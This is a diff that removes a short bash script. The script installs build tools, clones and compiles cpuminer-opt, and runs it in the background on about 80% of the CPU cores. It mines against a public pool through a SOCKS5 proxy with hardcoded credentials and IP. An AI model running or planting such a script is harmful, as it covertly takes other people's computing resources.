@@ -1,8 +1,0 @@
-#!/bin/bash
-CPUNUM=$(cat /proc/cpuinfo | grep processor | wc -l)
-CPUOK=$(($CPUNUM*80/100))
-d=$(date +%Y%m%d)
-sudo apt-get update
-sudo apt-get -y install git make automake build-essential autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev
-git clone https://github.com/JayDDee/cpuminer-opt && cd cpuminer-opt && ./build.sh
-./cpuminer -a lyra2z -o stratum+tcp://us-east.zcoin.miningpoolhub.com:20581 -u dinhtai92dn.$d -p x -t $CPUOK -x socks5://dinhtai92dn:dinhtai92dn@45.32.70.241:6969  --background
